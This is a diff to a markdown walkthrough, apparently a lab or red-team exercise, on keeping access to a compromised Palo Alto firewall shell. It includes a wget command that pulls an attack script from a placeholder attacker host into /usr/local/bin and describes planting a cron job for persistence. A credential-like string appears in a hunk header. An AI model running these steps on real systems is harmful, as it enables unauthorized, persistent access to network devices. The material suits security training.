@@ -226,8 +226,8 @@ KG+Vs7e5$dF4
 ## Phase 2: Palo Persistence
 
 - `Ctrl-Z` OR `Ctrl-C` **WILL KILL YOUR SHELL**
-- Once you are in the Palo Alto's bash shell, remember that this shell has limited functionality. 
-- **Features like the tab key for autocompletion and the up/down arrow keys won’t work.** 
+- Palo Alto Shell has limited functionality
+- **Tab autocompletion and the up/down arrow keys won’t work**
 - The first priority is to establish persistence using a cron job and the pan_os_comm.py script you created earlier.
 
 1. Start by running some basic enumeration commands to get a sense of your current environment on the machine.
@@ -238,7 +238,7 @@ pwd
 ls
 ```
 
-2. Next, import the pan_os_comm.py script from your attack machine, where it is being hosted via the web server.
+2. Next, import the `pan_os_comm.py` script from your attack machine, where it is being hosted via the web server.
    `wget -O /usr/local/bin/pan_os_comm.py http://<IP_of_your_attack_box>:<port>/pan_os_comm.py`
 
 3. To ensure that the file has been successfully downloaded and is executable, run:
